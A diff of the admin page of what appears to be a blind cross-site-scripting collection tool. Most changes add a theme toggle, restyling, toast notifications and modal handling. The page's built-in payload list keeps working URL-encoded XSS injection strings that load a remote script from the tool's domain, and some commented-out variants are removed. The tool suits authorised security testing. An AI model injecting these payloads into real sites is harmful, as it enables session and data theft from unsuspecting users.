@@ -1,62 +1,164 @@
 <!DOCTYPE html>
-<html>
+<html data-theme="dark">
 <head>
     <title>Admin Page</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
+        :root {
+            /* Light theme colors */
+            --light-bg: #f0f4fd;
+            --light-surface: #ffffff;
+            --light-primary: #7c93d9;
+            --light-secondary: #8fa7e6;
+            --light-accent: #a387b8;
+            --light-text: #2a2d3e;
+            --light-error: #e07070;
+            --light-success: #7cc488;
+            --light-warning: #e5c870;
+            --light-border: #d1d9f0;
+            --light-divider: #e0e6f5;
+            --light-hover: #e6ecfa;
+            --light-active: #d9e1f6;
+            --light-shadow: rgba(0, 0, 0, 0.05);
+            
+            /* Dark theme colors */
+            --dark-bg: #2a2d3e;
+            --dark-surface: #373b52;
+            --dark-primary: #a3b8ef;
+            --dark-secondary: #b8c2e0;
+            --dark-accent: #c9abdb;
+            --dark-text: #e4ecff;
+            --dark-error: #f0a3a3;
+            --dark-success: #a5e0b0;
+            --dark-warning: #f0d8a2;
+            --dark-border: #474c64;
+            --dark-divider: #3c415b;
+            --dark-hover: #424561;
+            --dark-active: #484c6b;
+            --dark-shadow: rgba(0, 0, 0, 0.2);
+        }
+
+        /* Default to dark theme */
+        html[data-theme="dark"] {
+            --bg: var(--dark-bg);
+            --surface: var(--dark-surface);
+            --primary: var(--dark-primary);
+            --secondary: var(--dark-secondary);
+            --accent: var(--dark-accent);
+            --text: var(--dark-text);
+            --error: var(--dark-error);
+            --success: var(--dark-success);
+            --warning: var(--dark-warning);
+            --border: var(--dark-border);
+            --divider: var(--dark-divider);
+            --hover: var(--dark-hover);
+            --active: var(--dark-active);
+            --shadow: var(--dark-shadow);
+        }
+
+        html[data-theme="light"] {
+            --bg: var(--light-bg);
+            --surface: var(--light-surface);
+            --primary: var(--light-primary);
+            --secondary: var(--light-secondary);
+            --accent: var(--light-accent);
+            --text: var(--light-text);
+            --error: var(--light-error);
+            --success: var(--light-success);
+            --warning: var(--light-warning);
+            --border: var(--light-border);
+            --divider: var(--light-divider);
+            --hover: var(--light-hover);
+            --active: var(--light-active);
+            --shadow: var(--light-shadow);
+        }
+
+        * {
+            box-sizing: border-box;
+            transition: background-color 0.3s, color 0.3s, border-color 0.3s;
+        }
+
         body {
-            background-color: #03396c;
-            color: #b3cde0;
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 16px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            line-height: 1.6;
         }
         
         table, th, td {
             border-collapse: collapse;
-            border: 1px solid #ddd;
-            /* background-color: #005b96; */
+            border: 1px solid var(--border);
         }
 
         th, td {
-            padding: 10px;
+            padding: 12px;
             text-align: left;
         }
 
         th {
-            background-color: #011f4b;
-            color: white;
+            background-color: var(--surface);
+            color: var(--primary);
+            font-weight: 600;
+            position: sticky;
+            top: 0;
         }
 
         tr:nth-child(even) {
-            background-color: #004878;
+            background-color: var(--hover);
         }
 
         tr:nth-child(odd) {
-            background-color: #005b96;
+            background-color: var(--surface);
         }
 
-        input[type="text"] {
-            padding: 10px;
+        tr:hover {
+            background-color: var(--active);
+        }
+
+        input[type="text"], input[type="password"] {
+            padding: 10px 14px;
             margin-bottom: 20px;
-            border: none;
-            border-radius: 5px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
             width: 97%;
+            background-color: var(--surface);
+            color: var(--text);
+            font-size: 14px;
         }
 
         textarea {
-            padding: 10px;
+            padding: 10px 14px;
             margin-bottom: 20px;
-            border: none;
-            border-radius: 5px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
             width: 97%;
             height: 200px;
+            background-color: var(--surface);
+            color: var(--text);
+            font-family: inherit;
+            font-size: 14px;
+            resize: vertical;
         }
 
         hr {
-            border: 1px solid #ddd;
-            margin: 20px 0;
+            border: none;
+            border-top: 1px solid var(--divider);
+            margin: 24px 0;
         }
 
         .flex-table {
             display: flex;
             flex-direction: column;
+            gap: 16px;
+            padding: 16px;
+            border-radius: 12px;
+            background-color: var(--surface);
+            box-shadow: 0 4px 12px var(--shadow);
         }
 
         .invisible {
@@ -67,17 +169,38 @@
             width: 85%;
         }
 
+        #navvar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 16px;
+            padding: 8px;
+            border-radius: 12px;
+            background-color: var(--surface);
+            box-shadow: 0 4px 12px var(--shadow);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
         .navbar {
-            border-radius: 10px;
-            background-color: #011f4b;
-            color: white;
-            padding: 8px 5px;
-            border: none;
+            border-radius: 8px;
+            background-color: var(--surface);
+            color: var(--primary);
+            padding: 10px 16px;
+            border: 1px solid var(--primary);
             cursor: pointer;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
         }
 
         .navbar:hover {
-            background-color: #00183c;
+            background-color: var(--primary);
+            color: var(--surface);
+            transform: translateY(-2px);
         }
         
         .modal {
@@ -90,205 +213,490 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            overflow: scroll;
+            overflow: auto;
+            z-index: 1000;
+            backdrop-filter: blur(4px);
         }
 
         .modal_div {
-            background-color: #03396c;
+            background-color: var(--surface);
             margin: auto;
-            padding: 20px;
-            width: 80%;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 24px;
+            width: 90%;
+            max-width: 90%;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px var(--shadow);
             overflow: auto;
+            max-height: 90vh;
+            position: relative;
         }
 
         .action_button {
-            background-color: #6497b1;
-            color: white;
-            padding: 10px;
+            background-color: var(--primary);
+            color: var(--surface);
+            padding: 10px 16px;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.2s ease;
         }
 
         .action_button:hover {
-            /* background-color: #0056b3; */
-            background-color: #4a7d96;
+            background-color: var(--secondary);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px var(--shadow);
         }
 
         .payload_maker_button {
-            background-color: #6497b1;
-            color: white;
-            padding: 10px;
+            background-color: var(--accent);
+            color: var(--surface);
+            padding: 10px 16px;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
+            font-weight: 500;
             margin-right: 10px;
+            transition: all 0.2s ease;
         }
 
         .payload_maker_button:hover {
-            /* background-color: #0056b3; */
-            background-color: #4a7d96;
+            opacity: 0.9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px var(--shadow);
         }
 
         .status_good {
-            color: #28a745;
+            color: var(--success);
+            font-weight: 500;
+            padding: 8px 12px;
+            border-radius: 8px;
+            background-color: rgba(165, 224, 176, 0.1);
+            display: inline-block;
         }
 
         .status_bad {
-            color: #dc3545;
+            color: var(--error);
+            font-weight: 500;
+            padding: 8px 12px;
+            border-radius: 8px;
+            background-color: rgba(240, 163, 163, 0.1);
+            display: inline-block;
         }
 
         .close_button {
-            background-color: #dc3545;
-            color: white;
-            padding: 10px;
+            background-color: var(--error);
+            color: var(--surface);
+            padding: 8px 16px;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
             position: absolute;
-            right: 10%;
+            right: 24px;
+            top: 24px;
+            font-weight: 500;
+            transition: all 0.2s ease;
         }
 
         .close_button:hover {
-            background-color: #c82333;
+            opacity: 0.9;
+            transform: translateY(-2px);
         }
 
         .payload_fires_title_cell {
-            font-weight: bold;
+            font-weight: 600;
         }
 
         .payload_fires_cell {
-            padding: 10px;
-            border-bottom: 1px solid #dee2e6;
+            padding: 12px;
+            border-bottom: 1px solid var(--divider);
         }
 
         #settingsTable {
-            margin-bottom: 10px;
+            margin-bottom: 16px;
+            width: 100%;
         }
 
         .settings_cell {
-            padding: 10px;
-            border-bottom: 1px solid #dee2e6;
+            padding: 12px;
+            border-bottom: 1px solid var(--divider);
         }
 
         .payload_div {
-            padding: 10px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #dee2e6;
-            overflow: auto;
+            padding: 16px;
+            margin-bottom: 16px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            background-color: var(--surface);
+            box-shadow: 0 2px 8px var(--shadow);
+            transition: all 0.2s ease;
+        }
+
+        .payload_div:hover {
+            box-shadow: 0 4px 12px var(--shadow);
+            transform: translateY(-2px);
         }
 
         .payload_title {
-            font-weight: bold;
+            font-weight: 600;
+            color: var(--primary);
+            margin-top: 0;
         }
 
         .payload_description {
-            padding-bottom: 10px;
+            padding-bottom: 16px;
+            color: var(--text);
+            opacity: 0.9;
         }
 
         .payload_code {
-            padding: 10px;
-            border: 1px solid #dee2e6;
-            border-radius: 5px;
+            padding: 16px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
             cursor: pointer;
+            background-color: var(--bg);
+            position: relative;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
         }
 
         .payload_code:hover {
-            background-color: #00183c;
+            background-color: var(--hover);
+        }
+
+        .payload_code::after {
+            content: "Click to copy";
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background-color: var(--primary);
+            color: var(--surface);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+
+        .payload_code:hover::after {
+            opacity: 1;
         }
 
         .payload_author {
             cursor: pointer;
             text-decoration: underline;
-            margin-bottom: 0px;
-            margin-top: 0px;
+            margin-bottom: 4px;
+            margin-top: 0;
+            color: var(--accent);
         }
 
         .payload_author:hover {
-            color: #007bff;
+            color: var(--secondary);
         }
 
         .modal_element_div {
-            padding-top: 4px;
-            padding-bottom: 4px;
-            overflow: scroll;
-
+            padding: 8px 0;
+            margin-bottom: 8px;
+            border-bottom: 1px solid var(--divider);
         }
 
         .modal_element_label {
             display: inline;
-            font-weight: bold;
+            font-weight: 600;
+            color: var(--primary);
         }
 
         .modal_element_item {
             display: inline;
+            word-break: break-word;
         }
 
         .image {
-            background-color: white;
+            background-color: var(--surface);
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 1px solid var(--border);
         }
 
         .thumbnail {
-            background-color: white;
+            background-color: var(--surface);
             width: 100px;
             height: 100px;
+            object-fit: cover;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            transition: transform 0.2s ease;
+        }
+
+        .thumbnail:hover {
+            transform: scale(1.05);
         }
 
         .update_div {
             display: flex;
-            padding: 5px;
+            flex-direction: column;
+            padding: 16px;
             margin-bottom: 20px;
-            background-color: #011f4b;
-            border: 1px solid #ddd;
+            background-color: var(--surface);
+            border: 1px solid var(--border);
             border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 12px var(--shadow);
         }
 
         .update_header {
             font-weight: 600;
-            /* color: #03396c; */
+            color: var(--primary);
+            margin-top: 0;
         }
 
         .user_payload_header {
-            margin-top: 5px;
+            margin-top: 8px;
+            color: var(--accent);
         }
 
         .payload_legend {
-            padding: 10px;
-            border: 1px solid #ddd;
+            padding: 16px;
+            border: 1px solid var(--border);
             border-radius: 8px;
-            margin-bottom: 10px;
+            margin-bottom: 16px;
+            background-color: var(--surface);
+            box-shadow: 0 2px 8px var(--shadow);
         }
 
         .user_payloads_legend {
-            padding: 10px;
-            border: 1px solid #ddd;
+            padding: 12px;
+            border: 1px solid var(--border);
             border-radius: 8px;
-            margin-bottom: 10px;
-            /* make it scroll if overflow */
+            margin-bottom: 12px;
+            background-color: var(--bg);
             overflow: auto;
         }
 
         .payload_example {
-            padding: 10px;
-            border: 1px solid #ddd;
+            padding: 16px;
+            border: 1px solid var(--border);
             border-radius: 8px;
-            margin-bottom: 10px;
+            margin-bottom: 16px;
+            background-color: var(--surface);
+            box-shadow: 0 2px 8px var(--shadow);
         }
 
         .exported_payloads {
-            padding: 10px;
-            border: 1px solid #ddd;
+            padding: 16px;
+            border: 1px solid var(--border);
             border-radius: 8px;
-            margin-bottom: 10px;
+            margin-bottom: 16px;
             overflow: auto;
             cursor: pointer;
+            background-color: var(--bg);
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+            white-space: pre-wrap;
+            max-height: 300px;
         }
 
         .exported_payloads:hover {
-            background-color: #00183c;
+            background-color: var(--hover);
+        }
+
+        /* Theme toggle switch */
+        .theme-toggle {
+            display: flex;
+            align-items: center;
+            margin-left: auto;
+        }
+
+        .theme-label {
+            margin-right: 8px;
+            font-size: 14px;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 48px;
+            height: 24px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: var(--secondary);
+            transition: .4s;
+            border-radius: 24px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: var(--surface);
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: var(--accent);
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(24px);
+        }
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            #navvar {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            
+            .theme-toggle {
+                margin: 8px 0;
+                justify-content: flex-end;
+            }
+            
+            .modal_div {
+                width: 95%;
+                padding: 16px;
+            }
+            
+            .close_button {
+                top: 16px;
+                right: 16px;
+            }
+            
+            table {
+                display: block;
+                overflow-x: auto;
+                white-space: nowrap;
+            }
+            
+            .value_cell {
+                width: auto;
+            }
+        }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg);
+            border-radius: 8px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 8px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--secondary);
+        }
+
+        /* Add form field container styles for better layout */
+        .form-field {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 16px;
+            width: 100%;
+        }
+
+        .form-field label {
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .form-field input[type="text"] {
+            width: 100%;
+            margin-bottom: 0;
+        }
+
+        /* Improve payload maker styling */
+        #payload_maker_form {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            margin-top: 16px;
+        }
+
+        .payload-button-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        /* Toast notification styles */
+        .toast-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+
+        .toast {
+            background-color: var(--surface);
+            color: var(--text);
+            border-left: 4px solid var(--success);
+            padding: 12px 24px;
+            margin-bottom: 10px;
+            border-radius: 6px;
+            box-shadow: 0 4px 12px var(--shadow);
+            display: flex;
+            align-items: center;
+            animation: slideIn 0.3s ease, fadeOut 0.5s ease 2.5s forwards;
+            max-width: 300px;
+            font-weight: 500;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+
+        .toast-success {
+            border-left-color: var(--success);
+        }
+
+        .toast-error {
+            border-left-color: var(--error);
+        }
+
+        .toast-warning {
+            border-left-color: var(--warning);
+        }
+
+        .toast-icon {
+            margin-right: 8px;
         }
     </style>
 </head>
@@ -300,6 +708,14 @@
         <button class="navbar" onclick="navbar('payloads')">Payloads</button>
         <button class="navbar" onclick="navbar('payload_maker')">Payload Maker</button>
         <button class="navbar" onclick="navbar('payload_import_export')">Payload Importer/Exporter</button>
+        
+        <div class="theme-toggle">
+            <span class="theme-label">Dark Mode</span>
+            <label class="switch">
+                <input type="checkbox" id="theme-toggle" checked>
+                <span class="slider"></span>
+            </label>
+        </div>
     </div>
     <div id="payload_fires" class="flex-table">
         <div>
@@ -307,7 +723,6 @@
             <button class="action_button" onclick="refreshPayloadFires()">Refresh</button>
         </div>
         
-
         <div id="special_update_div"></div>
         <table class="payload_fires_table" id="payloadFiresTable">
             <tr class="payload_fires_header">
@@ -363,6 +778,27 @@
         <h1>Payload Importer/Exporter</h1>
     </div>
     <script>
+        // Theme management
+        const themeToggle = document.getElementById('theme-toggle');
+        const htmlElement = document.documentElement;
+        
+        // Load theme from localStorage
+        function loadTheme() {
+            const savedTheme = localStorage.getItem('theme') || 'dark';
+            htmlElement.setAttribute('data-theme', savedTheme);
+            themeToggle.checked = savedTheme === 'dark';
+        }
+        
+        // Initialize theme
+        loadTheme();
+        
+        // Toggle theme
+        themeToggle.addEventListener('change', function() {
+            const newTheme = this.checked ? 'dark' : 'light';
+            htmlElement.setAttribute('data-theme', newTheme);
+            localStorage.setItem('theme', newTheme);
+        });
+
         function loadPayloadFires() {
             var page = 1;
             var limit = 10;
@@ -451,8 +887,6 @@
             make_modal_element('b', 'p', `Was Iframe: `, payloadFire.was_iframe, modalContent);
             make_modal_element('b', 'p', `Browser Timestamp: `, payloadFire.browser_timestamp, modalContent);
             make_modal_element('b', 'p', `Correlated Request: `, payloadFire.correlated_request, modalContent);
-
-            // make_element('button', 'Close', modalContent, 'close_button', modal.remove.bind(modal));
 
             document.body.appendChild(modal);
         }
@@ -572,12 +1006,8 @@
                 { title: 'Basic Payload', description: 'This is a basic payload', payload: '%27%22%3Cscript%20src%3D%27/script_domain/%27%3E%3C%2Fscript%3E', is_static: true },
                 { title: 'Javascript URI', description: 'This is a payload that uses a javascript URI', payload: 'javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%5C%27script%5C%5C%27%29%3Ba.src%3D%5C%5C%27/script_domain/%5C%5C%27%3Bdocument.body.appendChild%28a%29%27%29', is_static: true },
                 { title: 'IMG Error', description: 'Payload triggers on img error', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E', is_static: true },
-                // { title: 'IMG error', description: 'Payload triggers on img error', payload: '%27%22%3E%3Cimg%20src%3Dx%20id%3D/script_base64/%20onerror%3Deval%28atob%28this.id%29%29%3E', is_static: true },
                 { title: 'Input Tag Payload', description: 'HTML5 input-based payload', payload: '%27%22%3E%3Cinput%20onfocus%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%20autofocus%3E', is_static: true },
-                // { title: 'Video Source Payload', description: 'Video Source payload', payload: '%27%22%3E%3Cvideo%3E%3Csource%20onerror%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%3E', is_static: true },
-                // { title: 'Iframe with HTML entities', description: 'Iframe that uses HTML Entities', payload: '%27%22%3E%3Ciframe%20srcdoc%3D%22/script_htmlencode/%22%3E', is_static: true },
                 { title: 'Jquery Payload', description: 'Payload exclusive to jquery', payload: '%3Cscript%3E%24.getScript%28%22/script_domain/%22%29%3C%2Fscript%3E', is_static: true },
-                // { title: 'CSP Bypass', author: '@BRuteLogic', author_link: 'https://twitter.com/BRuteLogic', description: 'Payload against "script-src"', payload: '%3CIframe%20SrcDoc%3D%0A%22%3CScript%20Src%3D/script_domain/%3E%3C%2FScript%3E%22%3E'}
             ];
 
             fetch('/api/v1/user_payloads', {
@@ -677,7 +1107,6 @@
 
             var payload_example_div = make_div('payload_example', payloadMaker);
             make_element('button', 'Copy to Clipboard', payload_example_div, 'payload_maker_button', function() {
-                // Custom function to copy to clipboard based on the id so it has to find the element by id
                 var text = document.getElementById('payload_code').textContent;
                 copyToClipboard(text);
             });
@@ -688,55 +1117,75 @@
             var payloadMakerForm = make_element('form', null, payloadMaker);
             payloadMakerForm.id = 'payload_maker_form';
 
-            make_element('button', 'Add /script_domain/', payloadMakerForm, 'payload_maker_button', function(event) {
+            // Create button group container for better layout
+            var buttonGroup = make_div('payload-button-group', payloadMakerForm);
+
+            make_element('button', 'Add /script_domain/', buttonGroup, 'payload_maker_button', function(event) {
                 event.preventDefault();
-                var input = payloadMakerForm.getElementsByTagName('input')[0];
+                var input = document.getElementById('payload_input');
                 input.value += '/script_domain/';
             });
-            make_element('button', 'Add /script_hostname/', payloadMakerForm, 'payload_maker_button', function(event) {
+            make_element('button', 'Add /script_hostname/', buttonGroup, 'payload_maker_button', function(event) {
                 event.preventDefault();
-                var input = payloadMakerForm.getElementsByTagName('input')[0];
+                var input = document.getElementById('payload_input');
                 input.value += '/script_hostname/';
             });
-            make_element('button', 'Add /script_base64/', payloadMakerForm, 'payload_maker_button', function(event) {
+            make_element('button', 'Add /script_base64/', buttonGroup, 'payload_maker_button', function(event) {
                 event.preventDefault();
-                var input = payloadMakerForm.getElementsByTagName('input')[0];
+                var input = document.getElementById('payload_input');
                 input.value += '/script_base64/';
             });
-            make_element('button', 'Add /script_htmlencode/', payloadMakerForm, 'payload_maker_button', function(event) {
+            make_element('button', 'Add /script_htmlencode/', buttonGroup, 'payload_maker_button', function(event) {
                 event.preventDefault();
-                var input = payloadMakerForm.getElementsByTagName('input')[0];
+                var input = document.getElementById('payload_input');
                 input.value += '/script_htmlencode/';
             });
 
-            make_element('br', null, payloadMakerForm)
-
-            make_element('label', 'Payload: ', payloadMakerForm);
-            payload_input = make_element('input', null, payloadMakerForm)
+            // Create form fields with better structure
+            var payloadField = make_div('form-field', payloadMakerForm);
+            make_element('label', 'Payload:', payloadField);
+            payload_input = make_element('input', null, payloadField)
             payload_input.type = 'text';
             payload_input.id = 'payload_input';
             payload_input.required = true;
             payload_input.onchange = function() {
-                console.log('change')
                 var example_payload = encode_payload(payload_input.value);
                 payload_example.textContent = decode_payload(example_payload);
             }
 
-            make_element('label', 'Title: ', payloadMakerForm);
-            make_element('input', null, payloadMakerForm).type = 'text';
-            make_element('label', 'Description: ', payloadMakerForm);
-            make_element('input', null, payloadMakerForm).type = 'text';
-            make_element('label', 'Author: ', payloadMakerForm);
-            make_element('input', null, payloadMakerForm).type = 'text';
-            make_element('label', 'Author Link: ', payloadMakerForm);
-            make_element('input', null, payloadMakerForm).type = 'text';
-            make_element('input', null, payloadMakerForm, 'action_button').type = 'submit';
+            var titleField = make_div('form-field', payloadMakerForm);
+            make_element('label', 'Title:', titleField);
+            var titleInput = make_element('input', null, titleField);
+            titleInput.type = 'text';
+            titleInput.id = 'title_input';
+
+            var descField = make_div('form-field', payloadMakerForm);
+            make_element('label', 'Description:', descField);
+            var descInput = make_element('input', null, descField);
+            descInput.type = 'text';
+            descInput.id = 'desc_input';
+
+            var authorField = make_div('form-field', payloadMakerForm);
+            make_element('label', 'Author:', authorField);
+            var authorInput = make_element('input', null, authorField);
+            authorInput.type = 'text';
+            authorInput.id = 'author_input';
+
+            var linkField = make_div('form-field', payloadMakerForm);
+            make_element('label', 'Author Link:', linkField);
+            var linkInput = make_element('input', null, linkField);
+            linkInput.type = 'text';
+            linkInput.id = 'link_input';
+
+            var submitBtn = make_element('input', null, payloadMakerForm, 'action_button');
+            submitBtn.type = 'submit';
+            submitBtn.value = 'Create Payload';
 
             payloadMakerForm.addEventListener('submit', function(event) {
                 event.preventDefault();
                 status.textContent = '';
                 status.className = '';
-                var input = payloadMakerForm.getElementsByTagName('input')[0];
+                var input = document.getElementById('payload_input');
                 if (!input.value) {
                     status.textContent = 'Payload is required';
                     status.className = 'status_bad';
@@ -746,10 +1195,10 @@
 
                 var form_data = new FormData();
                 form_data.append('payload', payload);
-                form_data.append('title', payloadMakerForm.getElementsByTagName('input')[1].value);
-                form_data.append('description', payloadMakerForm.getElementsByTagName('input')[2].value);
-                form_data.append('author', payloadMakerForm.getElementsByTagName('input')[3].value);
-                form_data.append('author_link', payloadMakerForm.getElementsByTagName('input')[4].value);
+                form_data.append('title', document.getElementById('title_input').value);
+                form_data.append('description', document.getElementById('desc_input').value);
+                form_data.append('author', document.getElementById('author_input').value);
+                form_data.append('author_link', document.getElementById('link_input').value);
 
                 fetch('/api/v1/user_payloads', {
                     method: 'POST',
@@ -759,6 +1208,7 @@
                     status.textContent = 'Payload Added';
                     status.className = 'status_good';
                     payload_example.textContent = '';
+                    payloadMakerForm.reset();
                 });
             });
         }
@@ -829,6 +1279,44 @@
             textArea.select();
             document.execCommand('copy');
             document.body.removeChild(textArea);
+            
+            // Show toast notification
+            showToast('Copied to clipboard successfully', 'success');
+        }
+
+        // Toast notification system
+        function showToast(message, type = 'success') {
+            // Create container if it doesn't exist
+            let container = document.querySelector('.toast-container');
+            if (!container) {
+                container = document.createElement('div');
+                container.className = 'toast-container';
+                document.body.appendChild(container);
+            }
+            
+            // Create the toast
+            const toast = document.createElement('div');
+            toast.className = `toast toast-${type}`;
+            
+            // Add icon based on type
+            let icon = '✓';
+            if (type === 'error') icon = '✗';
+            if (type === 'warning') icon = '⚠';
+            
+            toast.innerHTML = `<span class="toast-icon">${icon}</span> ${message}`;
+            
+            // Add to container
+            container.appendChild(toast);
+            
+            // Remove after animation completes
+            setTimeout(() => {
+                toast.remove();
+                
+                // Clean up container if empty
+                if (!container.hasChildNodes()) {
+                    container.remove();
+                }
+            }, 3000);
         }
 
         function loadCollectedPages() {
@@ -857,6 +1345,7 @@
 
                     const deleteButton = document.createElement('button');
                     deleteButton.textContent = 'Delete';
+                    deleteButton.className = 'action_button';
                     deleteButton.onclick = function() {
                         deleteCollectedPage(item.id);
                     };
@@ -1001,6 +1490,38 @@
 
         function make_modal(style_class) {
             var modal = make_element('div', null, null, style_class);
+            
+            // Add event listener to close modal when clicking outside
+            modal.addEventListener('click', function(event) {
+                // Check if the click was directly on the modal backdrop
+                // (not on any of its children)
+                if (event.target === modal) {
+                    modal.remove();
+                }
+            });
+            
+            // Add event listener for Escape key to close modal
+            function escapeKeyHandler(event) {
+                if (event.key === 'Escape' || event.keyCode === 27) {
+                    modal.remove();
+                    document.removeEventListener('keydown', escapeKeyHandler);
+                }
+            }
+            
+            document.addEventListener('keydown', escapeKeyHandler);
+            
+            // Clean up event listener when modal is removed
+            modal.addEventListener('remove', function() {
+                document.removeEventListener('keydown', escapeKeyHandler);
+            });
+            
+            // Override remove method to ensure event cleanup
+            const originalRemove = modal.remove;
+            modal.remove = function() {
+                document.removeEventListener('keydown', escapeKeyHandler);
+                originalRemove.call(modal);
+            };
+            
             return modal;
         }
 
